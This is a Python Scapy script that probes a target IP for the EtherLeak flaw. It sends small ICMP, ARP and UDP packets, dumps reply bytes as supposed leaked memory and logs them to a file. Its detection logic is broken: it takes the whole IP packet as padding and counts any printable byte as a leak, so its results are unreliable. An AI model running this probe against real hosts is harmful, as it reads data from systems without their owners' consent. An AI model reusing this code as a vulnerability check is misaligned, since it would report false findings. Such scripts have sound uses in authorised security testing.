from scapy.all import *
import re
import time

def analyze_padding(padding):
    """
    Analyze extracted padding for uninitialized memory patterns.
    Returns True if it looks like a memory leak, False otherwise.
    """
    hex_dump = " ".join(f"{b:02x}" for b in padding)  # Convert to hex
    ascii_chars = padding.decode("utf-8", errors="ignore")

    # Check if padding contains readable data (potential leak)
    if any(c.isprintable() for c in ascii_chars if c not in ['\n', '\r', '\t']):
        print(f"[!] Possible Memory Leak Detected:")
        print(f"    ➜ Hex Dump: {hex_dump}")
        print(f"    ➜ ASCII Interpretation: {ascii_chars.strip()}")
        return True
    return False

def send_small_packet(packet, iface):
    """
    Sends a packet and captures the response.
    """
    response = srp1(packet, iface=iface, timeout=3, verbose=False)
    if response:
        return bytes(response[Ether].payload) if response.haslayer(Ether) else None
    return None

def detect_etherleak(target_ip, interface="eth0"):
    """
    Sends multiple small packets (ICMP, ARP, UDP) and checks for memory leaks.
    """
    print(f"[*] Testing {target_ip} for EtherLeak vulnerabilities...")

    # Packet variations to test different protocol responses
    packets = {
        "ICMP": Ether()/IP(dst=target_ip)/ICMP(),
        "ARP": Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip),
        "UDP": Ether()/IP(dst=target_ip)/UDP(dport=1234)/Raw(load=b"A" * 10)  # Small payload
    }

    detected = False
    log_entries = []

    for proto, pkt in packets.items():
        print(f"[*] Sending {proto} test packet...")
        padding = send_small_packet(pkt, interface)

        if padding:
            print(f"[+] Response received for {proto}")
            if analyze_padding(padding):
                detected = True
                log_entries.append(f"{proto} Leak:\nHex: {padding.hex()}\nASCII: {padding.decode('utf-8', errors='ignore')}")

        time.sleep(1)  # Avoid flooding the target

    # Save log if memory leak detected
    if detected:
        with open("etherleak_results.log", "w") as log_file:
            log_file.write("\n".join(log_entries))
        print("[!] EtherLeak confirmed! Log saved as 'etherleak_results.log'.")
    else:
        print("[-] No confirmed leaks detected. Possible false positive.")

# Run the enhanced test
target_ip = "TARGET_IP"  # Update with your target
detect_etherleak(target_ip, interface="eth0")
